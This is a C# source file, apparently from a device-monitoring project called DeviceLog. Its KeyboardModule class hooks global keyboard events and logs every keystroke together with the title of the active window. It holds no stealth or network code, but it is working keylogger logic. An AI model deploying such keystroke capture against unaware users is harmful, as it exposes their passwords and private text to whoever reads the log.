using DeviceLog.Classes.Log;
using DeviceLog.Classes.Modules.Window;

namespace DeviceLog.Classes.Modules.Keyboard
{
    internal class KeyboardModule
    {
        private readonly KeyboardHook _keyboardHook;
        private readonly KeyboardLog _log;

        private string _currentWindowTitle;
        private readonly bool _windowTitle;
        private readonly WindowModule _windowModule;

        internal KeyboardModule(bool special, bool keyUp, bool keyDown, bool windowTitle)
        {
            _keyboardHook = new KeyboardHook(special);
            _log = new KeyboardLog();
            _windowModule = new WindowModule();

            _currentWindowTitle = "";
            _windowTitle = windowTitle;

            if (keyUp)
            {
                _keyboardHook.KeyUp += KeyPress;
            }

            if (keyDown)
            {
                _keyboardHook.KeyDown += KeyPress;
            }
        }

        private void KeyPress(string key)
        {
            if (_windowTitle)
            {
                string title = _windowModule.GetActiveWindowTitle();
                if (title != null && _currentWindowTitle != title)
                {
                    _currentWindowTitle = title;

                    _log.AddKey(System.Environment.NewLine);
                    _log.AddKey("[" + title + "]");
                    _log.AddKey(System.Environment.NewLine);
                }
            }
            _log.AddKey(key);
        }

        internal void Start()
        {
            _keyboardHook.Hook();
        }

        internal void Stop()
        {
            _keyboardHook.Unhook();
        }

        internal KeyboardLog GetLog()
        {
            return _log;
        }
    }
}
